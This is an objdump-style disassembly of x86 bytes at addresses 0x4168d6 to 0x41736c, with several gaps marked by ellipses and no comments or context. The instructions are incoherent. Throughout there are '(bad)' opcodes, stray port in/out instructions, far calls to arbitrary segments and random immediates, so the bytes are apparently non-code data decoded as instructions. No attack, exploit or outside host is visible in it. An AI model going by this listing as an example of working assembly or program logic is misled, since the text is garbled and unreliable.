  4168d6:	fisubr DWORD PTR [ecx-0x18dd66d4]
  4168dc:	mov    al,ds:0xacf2a753
  4168e1:	inc    edx
  4168e2:	not    DWORD PTR [ecx-0x7bd74ae1]
  4168e8:	imul   edi,DWORD PTR [edx-0x62bee3f0],0x0
	...
  416956:	shr    DWORD PTR [edi-0x4810cfa],1
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x9f284112
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	out    0x84,al
  416970:	mov    ebp,0xeaa86a5c
  416975:	ss arpl bx,cx
  416978:	pop    DWORD PTR [esi+ebx*2+0x32]
  41697c:	jae    0x416931
  41697e:	cmp    edi,DWORD PTR [ecx+edx*1+0x32]
  416982:	fsubr  DWORD PTR [ebx+0x5feac46a]
  416988:	mov    WORD PTR [ecx-0x6aa2cfcf],?
  41698e:	das    
  41698f:	push   esp
  416990:	aaa    
  416991:	push   ds
  416992:	data16 daa 
  416994:	mov    edx,0x5c41bc15
  416999:	xor    ecx,esp
  41699b:	push   ecx
  41699c:	sub    eax,0x6a646cff
  4169a1:	dec    esi
  4169a2:	add    ebx,DWORD PTR [edi+0x23]
  4169a5:	out    0x35,eax
  4169a7:	mov    dh,0x23
  4169a9:	es dec ebp
  4169ab:	outs   dx,DWORD PTR ds:[esi]
  4169ac:	es pop es
  4169ae:	lds    eax,FWORD PTR [esi]
  4169b0:	xchg   BYTE PTR [edx+ebp*4-0x2c],ch
  4169b4:	and    DWORD PTR [eax],0xffffff89
  4169b7:	out    dx,eax
  4169b8:	fist   WORD PTR [ebp-0x4f]
  4169bb:	inc    ax
  4169bd:	adc    al,0xd1
  4169bf:	loope  0x416944
  4169c1:	pop    ebp
  4169c2:	outs   dx,DWORD PTR ds:[esi]
  4169c3:	bound  esi,QWORD PTR [esi+ebp*4]
  4169c6:	inc    ebp
  4169c7:	jmp    0x416a07
  4169c9:	loop   0x416a02
  4169cb:	adc    BYTE PTR [ecx+eiz*4],ah
  4169ce:	push   ebx
  4169cf:	mov    WORD PTR ds:0xbe347461,es
  4169d5:	mov    bh,0x75
  4169d7:	mov    al,0x1f
  4169d9:	fucom  st(2)
  4169db:	add    DWORD PTR [ebx+eax*1-0x2552b347],eax
  4169e2:	popf   
  4169e3:	xchg   ebx,eax
  4169e4:	add    BYTE PTR [edi-0x7f],bl
  4169e7:	out    dx,al
  4169e8:	sub    DWORD PTR [ecx+0x8b9ac92],0xc2759f93
  4169f2:	pop    edi
  4169f3:	les    eax,FWORD PTR ds:0xd4d4a269
  4169f9:	pop    es
  4169fa:	into   
  4169fb:	pop    edx
  4169fc:	pop    edx
  4169fd:	rcl    DWORD PTR [ebx+0xd],1
  416a00:	mov    dh,0xa
  416a02:	adc    eax,0x73e8649
  416a07:	cmp    al,0x7e
  416a09:	lods   eax,DWORD PTR ds:[esi]
  416a0a:	fst    st(1)
  416a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a0d:	outs   dx,DWORD PTR ds:[esi]
  416a0e:	out    dx,al
  416a0f:	fstp   TBYTE PTR [ebp-0x8a3f97d]
  416a15:	in     al,0xc3
  416a17:	sbb    DWORD PTR ds:0xf390ee94,0x49c3ec17
  416a21:	mov    dh,0xb7
  416a23:	mov    esi,0x3254d822
  416a28:	mov    ah,0x5a
  416a2a:	push   cs
  416a2b:	mov    ch,0xe1
  416a2d:	mov    ch,BYTE PTR [edi+ecx*1]
  416a30:	std    
  416a31:	je     0x416a78
  416a33:	push   cs
  416a34:	dec    eax
  416a35:	xor    BYTE PTR [ebp+0x7e635bb9],bl
  416a3b:	or     bh,al
  416a3d:	xchg   edx,eax
  416a3e:	jb     0x416a4f
  416a40:	ud1    eax,DWORD PTR [edx]
  416a43:	leave  
  416a44:	push   edx
  416a45:	jecxz  0x416a8e
  416a47:	lds    ebp,FWORD PTR [edx]
  416a49:	retf   
  416a4a:	loopne 0x416a63
  416a4c:	xchg   BYTE PTR [ecx+esi*4+0x66],ah
  416a50:	jmp    0x416a27
  416a52:	call   0xeb6b9a89
  416a57:	jle    0x416aa4
  416a59:	sbb    al,dl
  416a5b:	jge    0x416a2d
  416a5d:	stc    
  416a5e:	test   BYTE PTR [edi+0x74],ch
  416a61:	sbb    eax,0xd9261762
  416a66:	pop    esp
  416a67:	mov    DWORD PTR [esi+0x625a6848],ebx
  416a6d:	dec    ebx
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x820c0ba3
  416ae4:	repz mov eax,0xf467
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	iret   
  416aef:	mov    ebx,0xfe66ded8
  416af4:	adc    DWORD PTR [esi],ebp
  416af6:	test   eax,0x35ee0cc0
  416afb:	xchg   ebx,eax
  416afc:	into   
  416afd:	adc    al,0x2e
  416aff:	into   
  416b00:	xchg   esi,eax
  416b01:	cli    
  416b02:	mov    ecx,0xc707535a
  416b07:	push   ebx
  416b08:	jle    0x416b69
  416b0a:	retf   
  416b0b:	or     DWORD PTR [esi],ebp
  416b0d:	retf   
  416b0e:	pop    eax
  416b0f:	mov    al,0x59
  416b11:	push   ds
  416b12:	jmp    DWORD PTR [esi+0x2f]
  416b15:	rcr    BYTE PTR [ebx+ebx*8],0x8e
  416b19:	inc    edx
  416b1a:	inc    esp
  416b1b:	dec    edi
  416b1c:	fistp  QWORD PTR [ebp+0x1f50ed30]
  416b22:	xchg   DWORD PTR [ebx],eax
  416b24:	int    0x25
  416b26:	jmp    0x9bb0:0xc4619905
  416b2d:	cmp    eax,0x5e49e166
  416b32:	push   cs
  416b33:	clc    
  416b34:	dec    edi
  416b35:	in     eax,dx
  416b36:	ss mov dl,0x43
  416b39:	push   edx
  416b3a:	test   DWORD PTR [esi+0x3f070a60],esp
  416b40:	cmc    
  416b41:	push   ebp
  416b42:	(bad)  
  416b43:	pop    edi
  416b44:	jne    0x416b7c
  416b46:	test   eax,0x89041bb7
  416b4c:	mov    bl,0xa0
  416b4e:	fcmovnu st,st(1)
  416b50:	popa   
  416b51:	das    
  416b52:	and    al,0x8a
  416b54:	shl    DWORD PTR [ebx-0x55],1
  416b57:	stc    
  416b58:	hlt    
  416b59:	dec    eax
  416b5a:	fst    DWORD PTR [eax]
  416b5c:	push   edi
  416b5d:	jmp    0x416b83
  416b5f:	pop    edx
  416b60:	call   0xea986798
  416b65:	fdivr  DWORD PTR [ebx]
  416b67:	das    
  416b68:	push   ebx
  416b69:	xor    cl,bh
  416b6b:	mov    DWORD PTR [ebp+0x5db15c59],esp
  416b71:	push   cs
  416b72:	dec    ebx
  416b73:	sbb    BYTE PTR [esi-0x88779c7],cl
  416b79:	test   BYTE PTR ds:0x19b8261f,dh
  416b7f:	jb     0x416b05
  416b81:	stos   DWORD PTR es:[edi],eax
  416b82:	xchg   edx,eax
  416b83:	adc    eax,0x47aa47e5
  416b88:	sar    bl,cl
  416b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b8b:	setp   BYTE PTR [edi*8+0x402ddccd]
  416b93:	mov    edi,0x91be6a51
  416b98:	mov    bh,0x48
  416b9a:	sbb    eax,ebp
  416b9c:	ret    0xa286
  416b9f:	dec    edx
  416ba0:	mov    al,0xfb
  416ba2:	dec    ebp
  416ba3:	cmp    bl,BYTE PTR [ebp-0x2113e824]
  416ba9:	mov    ah,0x33
  416bab:	jle    0x416b4a
  416bad:	jnp    0x416c1a
  416baf:	sbb    BYTE PTR [ebx+0x121a7866],ch
  416bb5:	xchg   esp,eax
  416bb6:	ss dec ebx
  416bb8:	rol    ah,cl
  416bba:	adc    edx,ecx
  416bbc:	adc    eax,0x6f28d120
  416bc1:	inc    esi
  416bc2:	cld    
  416bc3:	int3   
  416bc4:	cmp    al,BYTE PTR [ecx]
  416bc6:	pop    ebx
  416bc7:	mov    al,0x6
  416bca:	xlat   BYTE PTR ds:[ebx]
  416bcb:	and    DWORD PTR [eax+0x3c],0xffffffc4
  416bcf:	ds int3 
  416bd1:	mov    al,0x47
  416bd3:	push   esi
  416bd4:	dec    ecx
  416bd5:	ret    
  416bd6:	cmp    bh,bh
  416bd8:	push   ebx
  416bd9:	push   ss
  416bda:	jmp    0x680d39b4
  416bdf:	dec    ebx
  416be0:	sub    eax,0xcc0db39b
  416be5:	pop    ds
  416be6:	jecxz  0x416bd3
  416be8:	call   0x49:0x6f699cee
	...
  416c53:	add    BYTE PTR [eax],al
  416c55:	add    bl,ah
  416c57:	gs push cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x8b5b70a9
  416c63:	or     ah,BYTE PTR [ecx+0xf567ea]
  416c69:	add    BYTE PTR [eax],al
  416c6b:	add    DWORD PTR [eax],eax
  416c6d:	add    BYTE PTR [edi],dl
  416c6f:	cs stos DWORD PTR es:[edi],eax
  416c71:	shr    DWORD PTR [edi],cl
  416c73:	xchg   ebp,eax
  416c74:	fisub  DWORD PTR cs:[ecx+0x4]
  416c78:	and    eax,0x4387bd45
  416c7d:	push   ecx
  416c7e:	ins    DWORD PTR es:[edi],dx
  416c7f:	pop    edi
  416c80:	xor    ebx,DWORD PTR [esp+edx*1]
  416c83:	xchg   edi,eax
  416c84:	ss cmp eax,0x8ae7c501
  416c8a:	lock mov ds:0xb52bb454,eax
  416c90:	or     ecx,ebp
  416c92:	(bad)  
  416c93:	out    dx,al
  416c94:	mov    al,0xf3
  416c96:	repnz imul eax,DWORD PTR ds:0xf37b41df,0x7e
  416c9e:	cmp    eax,0x861907db
  416ca3:	ret    0xd311
  416ca6:	push   ebp
  416ca7:	jecxz  0x416d27
  416ca9:	mov    eax,0xdfb95696
  416cae:	ficom  WORD PTR [ecx-0xb48134e]
  416cb4:	(bad)  
  416cb5:	push   ebx
  416cb6:	pop    ss
  416cb7:	sub    al,0xdf
  416cb9:	jp     0x416d23
  416cbb:	mov    DWORD PTR [eax+0x7772ac47],ebp
  416cc1:	stc    
  416cc2:	cmc    
  416cc3:	mov    al,ds:0xf8506950
  416cc8:	aaa    
  416cc9:	mov    al,ds:0xf708f0d3
  416cce:	add    ecx,DWORD PTR gs:[ecx-0x44ca3aae]
  416cd5:	aam    0xf9
  416cd7:	ret    
  416cd8:	lods   eax,DWORD PTR ds:[esi]
  416cd9:	scas   al,BYTE PTR es:[edi]
  416cda:	jmp    DWORD PTR [eax]
  416cdc:	cdq    
  416cdd:	xor    al,0x7f
  416cdf:	jg     0x416c6b
  416ce1:	pop    edi
  416ce2:	stos   DWORD PTR es:[edi],eax
  416ce3:	pushf  
  416ce4:	push   ebx
  416ce5:	xor    eax,0x6de59493
  416cea:	xor    bh,BYTE PTR [eax-0x2a]
  416ced:	inc    ecx
  416cee:	enter  0x999c,0xdb
  416cf2:	and    bl,bh
  416cf4:	and    al,0xa2
  416cf6:	sysenter 
  416cf8:	xchg   edx,eax
  416cf9:	iret   
  416cfa:	cmp    ecx,ebx
  416cfc:	xchg   esp,eax
  416cfd:	push   edi
  416cfe:	jns    0x416d09
  416d00:	retf   0xe9fc
  416d03:	addr16 retw 
  416d06:	adc    edx,esp
  416d08:	pop    es
  416d09:	cmp    eax,0x7960ef85
  416d0e:	sti    
  416d0f:	das    
  416d10:	push   0xa0da1f3f
  416d15:	aam    0x20
  416d17:	push   0xffffff9f
  416d19:	xor    bl,BYTE PTR [esi-0x83bda15]
  416d1f:	lahf   
  416d20:	jno    0x416cb8
  416d22:	dec    ecx
  416d23:	cmp    DWORD PTR [ebp+0x286bf37],esp
  416d29:	and    DWORD PTR [eax+0x2657e6b],esi
  416d2f:	pop    ss
  416d30:	mov    edx,0x501319cd
  416d35:	pop    ebp
  416d36:	cli    
  416d37:	ja     0x416cce
  416d39:	mov    ds:0xf40fb929,al
  416d3e:	daa    
  416d3f:	hlt    
  416d40:	and    DWORD PTR [edx-0x30e8685b],esi
  416d46:	(bad)  
  416d47:	mov    esi,0x9747c899
  416d4c:	shl    DWORD PTR [ebp+0x62],0x28
  416d50:	out    dx,eax
  416d51:	add    al,0xee
  416d53:	call   0x8cf6:0xf6b1cca2
  416d5a:	loopne 0x416d0b
  416d5c:	and    cl,BYTE PTR [edi+edi*1-0x2]
  416d60:	lds    esp,FWORD PTR [ebx]
  416d62:	dec    eax
  416d63:	add    BYTE PTR [esi],dl
  416d65:	mov    ah,0x6
  416d67:	lds    esi,FWORD PTR [ebx]
  416d69:	mov    ebp,0xe51bb181
	...
  416dd6:	and    DWORD PTR [ebx-0x40445077],edx
  416ddc:	daa    
  416ddd:	lahf   
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	into   
  416de3:	nop
  416de4:	xor    eax,0xf6674c
  416de9:	add    BYTE PTR [eax],al
  416deb:	add    DWORD PTR [eax],eax
  416ded:	add    BYTE PTR [ebp+edi*1+0x4a],dh
  416df1:	out    0x1f,eax
  416df3:	adc    ebx,DWORD PTR [ebp-0x3b]
  416df6:	sub    DWORD PTR [ebx],esi
  416df8:	mov    ebp,0x45c3edd
  416dfd:	sbb    edx,DWORD PTR [edi-0x33d6fe4c]
  416e03:	bound  ecx,QWORD PTR [eax+0x7ee07eec]
  416e09:	and    al,0x1
  416e0b:	ja     0x416e0c
  416e0d:	stc    
  416e0e:	cs mov ebp,0x458f9d8f
  416e14:	jge    0x416db9
  416e16:	jp     0x416e51
  416e18:	(bad)  
  416e19:	pusha  
  416e1a:	pop    ss
  416e1b:	lahf   
  416e1c:	clc    
  416e1d:	inc    ebp
  416e1e:	cld    
  416e1f:	adc    DWORD PTR [eax-0x4a006088],edx
  416e25:	test   DWORD PTR [esi-0x14],ebp
  416e28:	jecxz  0x416dd9
  416e2a:	sub    DWORD PTR [esi-0x6a],edi
  416e2d:	lahf   
  416e2e:	xor    BYTE PTR [edi-0x57],0x1c
  416e32:	loopne 0x416e34
  416e34:	mov    eax,0xe6777a82
  416e39:	out    0xb2,al
  416e3b:	xor    DWORD PTR [ebp+0x29],ebp
  416e3e:	push   ecx
  416e3f:	cwde   
  416e40:	inc    ebx
  416e41:	shr    DWORD PTR [eax],cl
  416e43:	jne    0x416dd2
  416e45:	xor    ah,BYTE PTR [ebp-0x65f1b34]
  416e4b:	mov    bh,0x64
  416e4d:	loopne 0x416e22
  416e4f:	popa   
  416e50:	imul   esp,edi,0x2ed91933
  416e56:	je     0x416e98
  416e58:	lahf   
  416e59:	mov    esi,0xa3f5e58c
  416e5e:	mov    dl,0xa
  416e60:	jecxz  0x416ecc
  416e62:	mov    ch,0xdc
  416e64:	mov    BYTE PTR [ebx+0x11c06233],al
  416e6a:	popf   
  416e6b:	mov    ds:0x9770a92c,al
  416e70:	loopne 0x416e79
  416e72:	inc    edx
  416e73:	cmp    bh,0xbd
  416e76:	iret   
  416e77:	mov    bh,0x6e
  416e79:	and    eax,0xce70febc
  416e7e:	lods   eax,DWORD PTR ds:[esi]
  416e7f:	loopne 0x416e3b
  416e81:	add    DWORD PTR [eax+ebx*8+0x6e],edx
  416e85:	xchg   ebp,eax
  416e86:	iret   
  416e87:	xlat   BYTE PTR ds:[ebx]
  416e88:	nop
  416e89:	push   cs
  416e8a:	pushf  
  416e8b:	fxch   st(1)
  416e8d:	add    BYTE PTR ds:0xdafcc055,ch
  416e93:	repz (bad) 
  416e95:	(bad)  
  416e96:	pop    ds
  416e97:	push   es
  416e98:	mov    esp,0xe3015106
  416e9d:	push   ebx
  416e9e:	lock test DWORD PTR [edx-0xc9ef401],ebx
  416ea5:	stos   DWORD PTR es:[edi],eax
  416ea6:	sub    cl,BYTE PTR [eax+0x2baf7f9]
  416eac:	ja     0x416ea1
  416eae:	adc    eax,0x88690d37
  416eb3:	cmp    BYTE PTR [ebx+eax*8],cl
  416eb6:	mov    ds,WORD PTR [ebx+ebx*4+0x69f711c0]
  416ebd:	ds (bad) 
  416ebf:	jmp    0xa0fccf0d
  416ec4:	clc    
  416ec5:	xchg   esp,eax
  416ec6:	rol    DWORD PTR [ecx-0x27c5e064],cl
  416ecc:	outs   dx,DWORD PTR ds:[esi]
  416ecd:	test   al,0x6d
  416ecf:	fs push cs
  416ed1:	pop    ebp
  416ed2:	mov    DWORD PTR [esi],ebp
  416ed4:	jge    0x416e68
  416ed6:	dec    BYTE PTR [ecx-0x54a8cb87]
  416edc:	out    0x93,al
  416ede:	aad    0xdb
  416ee0:	stc    
  416ee1:	jae    0x416f1d
  416ee3:	cwde   
  416ee4:	not    DWORD PTR ds:0xa2ba58da
  416eea:	or     DWORD PTR [esp+edi*4],ebp
  416eed:	lock add BYTE PTR [eax],al
	...
  416f54:	add    BYTE PTR [eax],al
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x78588eea
  416f64:	inc    ebx
  416f65:	inc    esp
  416f66:	test   DWORD PTR [bx+si],0x10000
  416f6d:	add    BYTE PTR [esi],al
  416f6f:	bound  ebx,QWORD PTR [ebx]
  416f71:	out    0xa4,eax
  416f73:	sub    al,0xb2
  416f75:	(bad)  
  416f76:	or     al,0x61
  416f78:	adc    BYTE PTR [esi-0x3979a0ba],dl
  416f7e:	jae    0x416fa4
  416f80:	arpl   WORD PTR [ecx],sp
  416f82:	push   0xa276be93
  416f87:	out    dx,eax
  416f88:	loop   0x416fce
  416f8a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416f8c:	js     0x416f0f
  416f8e:	xor    DWORD PTR [eax-0x38e77832],eax
  416f94:	out    dx,al
  416f95:	addr16 sub eax,0x50caefa
  416f9b:	add    DWORD PTR [ebx+ecx*8+0x4a],ebp
  416f9f:	jecxz  0x416f5b
  416fa1:	or     DWORD PTR [ebx+0x50],esp
  416fa4:	out    dx,eax
  416fa5:	(bad)  
  416fa6:	rcl    DWORD PTR [edx-0x32],1
  416fa9:	push   ecx
  416faa:	popf   
  416fab:	add    esi,DWORD PTR [esi-0x47ad7e98]
  416fb1:	cdq    
  416fb2:	jg     0x416f5e
  416fb4:	adc    edx,edi
  416fb6:	sub    BYTE PTR [ebx],al
  416fb8:	cmp    DWORD PTR [ecx-0x1a513924],0xe3e739f3
  416fc2:	imul   edx,DWORD PTR [edi],0x199e21cb
  416fc8:	xor    eax,0xe7b1f247
  416fcd:	mov    DWORD PTR [ecx+0xa65daec],esi
  416fd3:	sub    edx,eax
  416fd5:	add    esi,DWORD PTR [ebx+edx*2+0x13]
  416fd9:	xor    esi,edi
  416fdb:	sbb    al,0xec
  416fdd:	xchg   esi,eax
  416fde:	jae    0x416f7f
  416fe0:	pushf  
  416fe1:	inc    edi
  416fe2:	fldcw  WORD PTR [edx-0x4f85d1e4]
  416fe8:	mov    ah,0x2d
  416fea:	fistp  DWORD PTR [edi+0x5f]
  416fed:	mov    esp,0xd9eaa756
  416ff2:	sbb    bl,BYTE PTR [esi]
  416ff4:	cdq    
  416ff5:	icebp  
  416ff6:	mov    esp,0x428e52d
  416ffb:	ret    0xcb85
  416ffe:	sub    ch,BYTE PTR [edi]
  417000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417001:	adc    BYTE PTR [ebx+0x25],ch
  417004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417005:	jns    0x41702f
  417007:	or     al,0xa6
  417009:	mov    bh,0xe3
  41700b:	imul   ebp,DWORD PTR [eax],0xa29cf8eb
  417011:	fwait
  417012:	test   eax,0xff1a969d
  417017:	dec    edi
  417018:	int    0x28
  41701a:	and    al,BYTE PTR [eax]
  41701c:	xor    eax,0x2be93e0e
  417021:	mov    ah,0x26
  417023:	daa    
  417024:	sti    
  417025:	mov    edi,0x710691e6
  41702a:	test   al,0xd8
  41702c:	fnstsw WORD PTR [edi]
  41702e:	in     eax,0x67
  417030:	rcl    BYTE PTR [edx+0x374779a8],cl
  417036:	and    eax,0x3a371ab5
  41703b:	xor    BYTE PTR [ecx],bl
  41703d:	inc    ebx
  41703e:	fiadd  WORD PTR [edx-0x76]
  417041:	ror    edx,1
  417043:	(bad)  
  417044:	sbb    eax,0xaef259e4
  417049:	das    
  41704a:	in     al,dx
  41704b:	xor    BYTE PTR [edx],0x1e
  41704e:	jbe    0x417074
  417050:	add    BYTE PTR [eax+esi*1],dh
  417053:	xchg   edx,eax
  417054:	adc    al,0xe0
  417056:	mov    DWORD PTR [edx+0x47],esp
  417059:	mov    esi,DWORD PTR [ebp+0x47]
  41705c:	adc    esi,DWORD PTR [ebp-0x5d5a1ef9]
  417062:	addr16 aam 0xa0
  417065:	js     0x417048
  417067:	sti    
  417068:	ret    
  417069:	adc    esi,DWORD PTR [eax+0x0]
  41706c:	jo     0x417090
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    esp,ecx
  4170e3:	call   0x0:0xf8671ba9
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	sahf   
  4170ef:	scas   eax,DWORD PTR es:[edi]
  4170f0:	pop    ebp
  4170f1:	icebp  
  4170f2:	int3   
  4170f3:	sub    edx,DWORD PTR cs:[edx-0x46]
  4170f7:	add    ch,BYTE PTR [eax+0x37c133cd]
  4170fd:	push   ds
  4170fe:	jl     0x41710a
  417100:	inc    esp
  417101:	(bad)  
  417102:	jmp    FWORD PTR [ebp+0x59]
  417105:	jae    0x41712d
  417107:	stos   DWORD PTR es:[edi],eax
  417108:	sub    al,0x51
  41710a:	mov    edi,DWORD PTR [ebp+0x2]
  41710d:	dec    esi
  41710e:	test   al,0x18
  417110:	push   0x7e
  417112:	idiv   BYTE PTR [edx-0x3fdbb427]
  417118:	repnz push ebp
  41711a:	rcl    BYTE PTR [edx],1
  41711c:	ror    DWORD PTR [ecx+0x1d89afb5],0xf3
  417123:	mov    ebx,0x2f98b7fd
  417128:	ja     0x4170dc
  41712a:	fisub  DWORD PTR ds:0xed859fd7
  417130:	add    BYTE PTR [edi-0x6a],ah
  417133:	in     al,0xb8
  417135:	enter  0xd4cd,0x9c
  417139:	ds das 
  41713b:	imul   ebx,DWORD PTR [ebx+0x11],0x16
  41713f:	jne    0x417168
  417141:	mov    ah,0x1d
  417143:	or     BYTE PTR [ecx+0x7c],bl
  417146:	in     eax,dx
  417147:	ja     0x41713b
  417149:	leave  
  41714a:	outs   dx,BYTE PTR ds:[esi]
  41714b:	popa   
  41714c:	sbb    ebx,esi
  41714e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41714f:	xor    edx,DWORD PTR [edx-0x25]
  417152:	arpl   si,dx
  417154:	pop    esp
  417155:	scas   eax,DWORD PTR es:[edi]
  417156:	es mov fs:0x5ca9e689,eax
  41715d:	(bad)  
  41715e:	loope  0x4171c5
  417160:	dec    esi
  417161:	or     eax,0x7b8b1d3c
  417166:	xchg   ecx,eax
  417167:	xchg   esi,eax
  417168:	arpl   WORD PTR [ecx+eax*1-0x18],dx
  41716c:	mov    ecx,0xa145e199
  417171:	pop    eax
  417172:	cmp    DWORD PTR [edi-0x63e2f5df],0xa0329b2d
  41717c:	aad    0x2
  41717e:	jne    0x417196
  417180:	div    DWORD PTR [ebx+edx*8]
  417183:	pop    es
  417184:	out    dx,al
  417185:	out    0xe5,al
  417187:	add    al,BYTE PTR [ebx+eax*4-0x2448552f]
  41718e:	sub    edi,ebx
  417190:	call   0x250b:0x291d7b1d
  417197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417198:	test   eax,0x655cba1d
  41719d:	sub    bl,BYTE PTR [edi+0x4a]
  4171a0:	pop    esp
  4171a1:	outs   dx,BYTE PTR ds:[esi]
  4171a2:	ret    0xf2f1
  4171a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171a6:	adc    ebp,DWORD PTR [ecx+0x60919b32]
  4171ac:	std    
  4171ad:	add    al,0x7b
  4171af:	ss mov edx,0x564b3754
  4171b5:	jne    0x417233
  4171b7:	out    0x3b,eax
  4171b9:	jp     0x41713b
  4171bb:	dec    edx
  4171bc:	xlat   BYTE PTR ds:[ebx]
  4171bd:	sbb    esi,ebx
  4171bf:	pop    ss
  4171c0:	icebp  
  4171c1:	inc    esi
  4171c2:	xchg   esi,eax
  4171c3:	add    DWORD PTR [edi],0x70
  4171c6:	out    0x78,eax
  4171c8:	std    
  4171c9:	mov    bh,BYTE PTR [ecx]
  4171cb:	fdivr  DWORD PTR [edx-0x75]
  4171ce:	stc    
  4171cf:	fcmovnbe st,st(0)
  4171d1:	and    ch,BYTE PTR [ebx+0x464d224d]
  4171d7:	pusha  
  4171d8:	push   ss
  4171d9:	jae    0x417173
  4171db:	pop    ds
  4171dc:	push   ecx
  4171dd:	loopne 0x4171a4
  4171df:	mov    esi,0xef51fb94
  4171e4:	sbb    al,0xad
  4171e6:	rcl    BYTE PTR ds:0xbd7f0d10,cl
  4171ec:	in     eax,0xda
	...
  417256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	sbb    DWORD PTR [eax+0x1a],esi
  41725a:	(bad)  
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	pop    es
  417263:	pop    eax
  417264:	mov    esp,0xf967f8
  417269:	add    BYTE PTR [eax],al
  41726b:	add    DWORD PTR [eax],eax
  41726d:	add    bh,bh
  41726f:	push   ss
  417270:	mov    esp,0x9ac755fd
  417275:	clc    
  417276:	es jle 0x4172d4
  417279:	push   cs
  41727a:	xlat   BYTE PTR ds:[ebx]
  41727b:	inc    ecx
  41727c:	xchg   esi,eax
  41727d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41727e:	jecxz  0x4172a8
  417280:	lahf   
  417281:	sbb    DWORD PTR [ecx],esp
  417283:	gs jbe 0x417211
  417286:	xor    dh,BYTE PTR [ebx+0x3]
  417289:	imul   edx,DWORD PTR [edi],0xedeb8a96
  41728f:	inc    ebx
  417290:	imul   esi,DWORD PTR [edx+edi*2],0x27416c48
  417297:	add    BYTE PTR [eax-0x3],ah
  41729a:	daa    
  41729b:	retf   
  41729c:	out    0x5f,al
  41729e:	push   esp
  41729f:	xor    dh,cl
  4172a1:	inc    edx
  4172a2:	cmc    
  4172a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a4:	mov    edi,DWORD PTR [ebp-0x70]
  4172a7:	jns    0x41722e
  4172a9:	pop    edx
  4172aa:	sub    BYTE PTR [edi-0x77],bl
  4172ad:	std    
  4172ae:	sbb    ecx,DWORD PTR [ebp+0x28f8e802]
  4172b4:	dec    esi
  4172b5:	pop    ebx
  4172b6:	xchg   edi,eax
  4172b7:	imul   edi,DWORD PTR [ecx-0x44fe51f3],0xf7e483c8
  4172c1:	pop    esi
  4172c2:	mov    ecx,DWORD PTR [edx-0x39]
  4172c5:	dec    ebx
  4172c6:	sub    eax,0x7c7c0824
  4172cb:	sub    BYTE PTR [esi+0x24],ch
  4172ce:	cli    
  4172cf:	mov    al,0xc6
  4172d1:	jb     0x41731c
  4172d3:	jecxz  0x417258
  4172d5:	xchg   ebp,eax
  4172d6:	sti    
  4172d7:	sub    DWORD PTR [esi],0xffffffe5
  4172da:	mov    ebx,0xdb60db32
  4172df:	lea    ebp,[ebx-0x56]
  4172e2:	dec    esi
  4172e3:	pop    ebx
  4172e4:	adc    ebx,DWORD PTR [ebx]
  4172e6:	ja     0x417271
  4172e8:	jae    0x4172f5
  4172ea:	imul   eax,DWORD PTR [ecx+0x69],0x66238f7e
  4172f1:	mov    ds:0x470b42b2,al
  4172f6:	add    DWORD PTR [esi+0x50],esp
  4172f9:	add    ecx,DWORD PTR [edx+0x44254dc4]
  4172ff:	fld    QWORD PTR [esi+0x62]
  417302:	loope  0x41737e
  417304:	jge    0x4172e4
  417306:	cmp    DWORD PTR [edx],ebx
  417308:	dec    esp
  417309:	pop    esi
  41730a:	jle    0x4172c0
  41730c:	mov    ch,0x9f
  41730e:	or     DWORD PTR [edi+edi*4+0x53],ebx
  417312:	retf   0xff69
  417315:	pop    edi
  417316:	inc    esp
  417317:	pop    edi
  417318:	xchg   ah,dh
  41731a:	rcl    DWORD PTR [esi-0x1d],1
  41731d:	or     dh,bh
  41731f:	dec    ecx
  417320:	call   0xc99b:0x43769710
  417327:	dec    ecx
  417328:	stos   BYTE PTR es:[edi],al
  417329:	fcom   st(3)
  41732b:	add    esi,DWORD PTR [edi]
  41732d:	loope  0x4172fc
  41732f:	ret    
  417330:	pop    eax
  417331:	bound  ebp,QWORD PTR [esi-0x78]
  417334:	das    
  417335:	jge    0x4172cb
  417337:	mov    eax,0x10d2c2c7
  41733c:	mov    cs,WORD PTR ds:0xfd68295b
  417342:	loop   0x4173a6
  417344:	fisub  DWORD PTR [edx]
  417346:	push   es
  417347:	pop    ebx
  417348:	rcr    DWORD PTR [ebx+0x2b],1
  41734b:	sub    BYTE PTR [ebx+edi*2+0x20],cl
  41734f:	adc    al,0xd7
  417351:	sbb    eax,0x1e93653e
  417356:	xor    ebp,0x3f
  417359:	test   al,0x1c
  41735b:	push   cs
  41735c:	popa   
  41735d:	cmp    eax,0xdc3c4e37
  417362:	sub    edx,esi
  417364:	mov    ah,0x69
  417366:	mov    ch,BYTE PTR [ebx+0x56]
  417369:	xchg   ecx,eax
  41736a:	pop    esp
  41736b:	dec    ebp
  41736c:	cmp    eax,0x89
	...
